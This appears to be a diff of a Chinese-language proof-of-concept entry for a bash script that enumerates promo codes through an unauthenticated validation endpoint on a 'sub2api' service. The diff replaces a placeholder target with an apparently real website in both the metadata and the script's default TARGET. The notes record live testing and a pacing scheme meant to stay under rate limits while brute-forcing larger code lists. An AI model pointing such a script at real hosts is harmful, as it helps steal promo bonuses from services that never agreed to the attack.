@@ -8,11 +8,11 @@
 - **language**: bash
 - **source**: self
 - **verified**: 1
-- **verified_note**: 2026-11-01 在 https://target485.example.com 实测：① 空 code → 400 且 message 为 "Invalid request: Key: 'ValidatePromoCodeRequest.Code' ... required"（证明 enabled 检查先于 binding 通过、进入 DB 分支）；② 25 个短码猜测全部 200 {"code":0,"data":{"valid":false,"error_code":"PROMO_CODE_NOT_FOUND"}}；③ 25 次按 7s 间隔无一 429，同站对照接口 26 连发第 21 次起 429（20/分桶），证明确实可低速跑更大字典。error_code 分级（DISABLED/EXPIRED/MAX_USED/valid+bonus_amount）由同版本源码 auth_handler.go:498-520 分支确认，本任务尚未拿到 valid:true 的命中样本（码为 16 位随机 hex）。
+- **verified_note**: 2026-11-01 在 https://www.dahurj999.top 实测：① 空 code → 400 且 message 为 "Invalid request: Key: 'ValidatePromoCodeRequest.Code' ... required"（证明 enabled 检查先于 binding 通过、进入 DB 分支）；② 25 个短码猜测全部 200 {"code":0,"data":{"valid":false,"error_code":"PROMO_CODE_NOT_FOUND"}}；③ 25 次按 7s 间隔无一 429，同站对照接口 26 连发第 21 次起 429（20/分桶），证明确实可低速跑更大字典。error_code 分级（DISABLED/EXPIRED/MAX_USED/valid+bonus_amount）由同版本源码 auth_handler.go:498-520 分支确认，本任务尚未拿到 valid:true 的命中样本（码为 16 位随机 hex）。
 - **path**: pocs/sub2api-validate-promo-code-unauth-enum-oracle/sub2api_promo_code_oracle.sh
 - **tags**: sub2api, promo-code, 优惠码, 枚举, oracle, 未授权, info-leak, error-code, bonus-amount, 限流绕过, 源码对照
 - **created_at**: 2026-11-01T08:14:55.931Z
-- **engine**: https://target485.example.com
+- **engine**: https://www.dahurj999.top
 
 ## 描述
 
@@ -39,8 +39,8 @@
 # 用法: bash sub2api_promo_code_oracle.sh codes.txt
 # 限速: 7s/条（标称 10/分，实测 25 连发不触发 429）
 
-TARGET="${TARGET:-https://target485.example.com}"
-UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/192.0.2.4 Safari/537.36"
+TARGET="${TARGET:-https://www.dahurj999.top}"
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"
 DICT="${1:-codes.txt}"
 CURL="curl -sS -k --noproxy * -A ${UA:Q} -m 10"
 
